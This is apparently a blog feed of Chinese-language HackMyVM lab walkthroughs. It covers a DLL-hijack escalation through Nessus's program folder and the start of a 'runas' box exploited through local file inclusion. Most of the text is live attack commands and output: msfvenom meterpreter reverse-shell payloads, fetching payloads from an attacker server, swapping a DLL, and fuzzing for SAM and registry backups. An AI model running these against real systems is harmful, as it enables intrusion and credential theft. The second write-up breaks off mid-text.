=&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 4445</span><br><span class="line">LPORT =&gt; 4445</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.56.103</span><br><span class="line">LHOST =&gt; 192.168.56.103</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.103:4445 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这直接上传的反弹shell会被杀毒清除掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; upload version.dll version.dll</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /myift/bachang/win/nessus/version.dll to C:\Program Files\Tenable\Nessus\version.dll</span><br><span class="line">                                        </span><br><span class="line">Data: 12288 bytes of 12288 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 legacy.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line">-a----         7/22/2025   9:41 PM              0 version.dll</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250722214529663.png" alt="image-20250722214529663"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; Invoke-WebRequest -Uri http://192.168.56.103:8888/version.dll -OutFile version.dll</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 legacy.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line">-a----         7/23/2025   9:49 AM           9216 version.dll</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>哟!这样传成功了</p><p>没有效果</p><p>换一个dll</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; Invoke-WebRequest -Uri http://192.168.56.103:8888/version.dll -OutFile legacy.dll</span><br><span class="line">The process cannot access the file &#x27;C:\Program Files\Tenable\Nessus\legacy.dll&#x27; because it is being used by another process.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Invoke-WebRequest -Uri http://192.168.56.103:8888/version.dll -OutFil ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], IOException</span><br><span class="line">    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 legacy.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line">-a----         7/23/2025   9:49 AM           9216 version.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; Invoke-WebRequest -Uri http://192.168.56.103:8888/version.dll -OutFile 1.dll</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----         7/23/2025   9:59 AM           9216 1.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 legacy.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line">-a----         7/23/2025   9:49 AM           9216 version.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; mv legacy.dll 2.dll</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----         7/23/2025   9:59 AM           9216 1.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 2.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line">-a----         7/23/2025   9:49 AM           9216 version.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; mv 1.dll legacy.dll</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 2.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----         7/23/2025   9:59 AM           9216 legacy.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line">-a----         7/23/2025   9:49 AM           9216 version.dll</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接传传不进去我们传完改名即可</p><p>又失败了</p><p>小丑了,这个是x64的架构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/win/nessus]</span><br><span class="line">└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=8081 -f dll -o 2.dll --arch x64</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 9216 bytes</span><br><span class="line">Saved as: 2.dll</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">vil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; Invoke-WebRequest -Uri http://192.168.56.103:8888/2.dll -OutFile 777.dll</span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 2.dll</span><br><span class="line">-a----         7/23/2025  10:28 AM           9216 777.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 start</span><br><span class="line">-a----         7/22/2025   9:35 PM             16 stop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; mv 777.dll legacy.dll</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.103:8081 </span><br><span class="line">[*] Sending stage (203846 bytes) to 192.168.56.156</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.103:8081 -&gt; 192.168.56.156:49670) at 2025-07-22 22:29:48 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3580 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.20348.587]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;type root.txt</span><br><span class="line">type root.txt</span><br><span class="line">b5fc5a4ebfc20cc18220a814e1aee0aa</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_runas</title>
      <link href="/2025/07/23/hackmyvm-runas/"/>
      <url>/2025/07/23/hackmyvm-runas/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250721112052579.png" alt="image-20250721112052579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/win/runas]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:96:80:36, IPv4: 192.168.56.103</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:81:30:5f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.109  08:00:27:56:13:ce       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.237 seconds (114.44 hosts/sec). 3 responded</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[/myift/bachang/win/runas]</span><br><span class="line">└─# nmap -sV -sC 192.168.56.109</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-20 23:22 EDT</span><br><span class="line">Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 32.25% done; ETC: 23:22 (0:00:02 remaining)</span><br><span class="line">Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 8.33% done; ETC: 23:23 (0:01:06 remaining)</span><br><span class="line">Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 41.67% done; ETC: 23:22 (0:00:15 remaining)</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.57 ((Win64) PHP/7.2.0)</span><br><span class="line">|_http-server-header: Apache/2.4.57 (Win64) PHP/7.2.0</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp  open  tcpwrapped</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: RUNAS-PC</span><br><span class="line">|   NetBIOS_Domain_Name: RUNAS-PC</span><br><span class="line">|   NetBIOS_Computer_Name: RUNAS-PC</span><br><span class="line">|   DNS_Domain_Name: runas-PC</span><br><span class="line">|   DNS_Computer_Name: runas-PC</span><br><span class="line">|   Product_Version: 6.1.7601</span><br><span class="line">|_  System_Time: 2025-07-21T03:23:03+00:00</span><br><span class="line">|_ssl-date: 2025-07-21T03:23:21+00:00; +2s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=runas-PC</span><br><span class="line">| Not valid before: 2025-07-20T03:15:10</span><br><span class="line">|_Not valid after:  2026-01-19T03:15:10</span><br><span class="line">5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 08:00:27:56:13:CE (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: Host: RUNAS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -36m01s, deviation: 1h20m30s, median: -2s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: runas-PC</span><br><span class="line">|   NetBIOS computer name: RUNAS-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2025-07-21T06:23:02+03:00</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_nbstat: NetBIOS name: RUNAS-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:56:13:ce (Oracle VirtualBox virtual NIC)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-07-21T03:23:02</span><br><span class="line">|_  start_date: 2025-07-21T03:15:10</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 76.27 seconds</span><br><span class="line">                                                                             </span><br></pre></td></tr></table></figure><p>去web服务看一下</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721112714280.png" alt="image-20250721112714280"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721113904907.png" alt="image-20250721113904907"></p><p>有任意文件读取</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721114038793.png" alt="image-20250721114038793"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721114002480.png" alt="image-20250721114002480"></p><p>这里也是非常的不合理</p><p>直接给两个flag读出来完了</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721114131649.png" alt="image-20250721114131649"></p><p>我们假装不知道flag的位置,先进行模糊匹配看看有什么东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/share/seclists/Fuzzing/LFI]</span><br><span class="line">└─# curl -s -w &quot;%&#123;size_download&#125;\n&quot; &quot;http://192.168.56.109/index.php?file=566&quot; -o /dev/null</span><br><span class="line">429</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[/usr/share/seclists/Fuzzing/LFI]</span><br><span class="line">└─# ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u &quot;http://192.168.56.109/index.php?file=FUZZ&quot; -fs 429</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://192.168.56.109/index.php?file=FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 429</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">C:/WINDOWS/Repair/SAM   [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 11ms]</span><br><span class="line">C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 3ms]</span><br><span class="line">C:/Windows/system32/config/regback/sam [Status: 200, Size: 627, Words: 84, Lines: 20, Duration: 3ms]</span><br><span class="line">C:/Windows/system32/config/regback/security [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 2ms]</span><br><span class="line">C:/Windows/system32/config/regback/default [Status: 200, Size: 631, Words: 84, Lines: 20, Duration: 4ms]</span><br><span class="line">C:/Windows/System32/inetsrv/config/applicationHost.config [Status: 200, Size: 79253, Words: 12108, Lines: 821, Duration: 1ms]</span><br><span class="line">C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 58608, Words: 8247, Lines: 599, Duration: 4ms]</span><br><span class="line">C:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 39ms]</span><br><span class="line">C:/Users/Administrator/NTUser.dat [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 50ms]</span><br><span class="line">C:/Windows/win.ini      [Status: 200, Size: 1042, Words: 103, Lines: 46, Duration: 63ms]</span><br><span class="line">C:/Windows/system32/config/regback/system [Status: 200, Size: 630, Words: 84, Lines: 20, Duration: 115ms]</span><br><span class="line">C:/Windows/system32/config/regback/software [Status: 200, Size: 632, Words: 84, Lines: 20, Duration: 119ms]</span><br><span class="line">c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1375, Words: 260, Lines: 39, Duration: 1ms]</span><br><span class="line">c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 946, Words: 171, Lines: 34, Duration: 2ms]</span><br><span class="line">c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 19622, Words: 8783, Lines: 303, Duration: 4ms]</span><br><span class="line">c:/php/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 129ms]</span><br><span class="line">c:/WINDOWS/setupact.log [Status: 200, Size: 25774, Words: 2482, Lines: 315, Duration: 4ms]</span><br><span class="line">c:/PHP/php.ini          [Status: 200, Size: 85387, Words: 11106, Lines: 1929, Duration: 137ms]</span><br><span class="line">c:/WINDOWS/setuperr.log [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 6ms]</span><br><span class="line">c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 111314, Words: 9007, Lines: 1208, Duration: 4ms]</span><br><span class="line">C:/Windows/repair/system [Status: 200, Size: 425, Words: 68, Lines: 18, Duration: 183ms]</span><br><span class="line">c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 1973, Words: 539, Lines: 45, Duration: 51ms]</span><br><span class="line">c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4760, Words: 774, Lines: 97, Duration: 54ms]</span><br><span class="line">:: Progress: [236/236] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::</span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721160951083.png" alt="image-20250721160951083"></p><p>找到一组md5</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721161650502.png" alt="image-20250721161650502"></p><p>得到账号密码</p><p>runas&#x2F;yakuzza</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721162625035.png" alt="image-20250721162625035"></p><p>接下来就是提权先拿到一个</p><p>meterpreter shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/win/runas]</span><br><span class="line">└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.103 lport=4444 -f exe &gt; shell.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/myift/bachang/win/runas]</span><br><span class="line">└─# python3 -m http.server 8888</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span><br><span class="line">192.168.56.109 - - [21/Jul/2025 04:58:34] &quot;GET /shell.exe HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.56.109 - - [21/Jul/2025 04:58:34] &quot;GET /shell.exe HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.56.109 - - [21/Jul/2025 04:59:28] &quot;GET /shell.exe HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.56.109 - - [21/Jul/2025 04:59:28] &quot;GET /shell.exe HTTP/1.1&quot; 200 -</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.56.103</span><br><span class="line">LHOST =&gt; 192.168.56.103</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444                                                                                               </span><br><span class="line">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.103:4444 </span><br><span class="line">[*] Sending stage (177734 bytes) to 192.168.56.109</span><br><span class="line">[*] Meterpreter session 26 opened (192.168.56.103:4444 -&gt; 192.168.56.109:49215) at 2025-07-21 05:11:31 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span 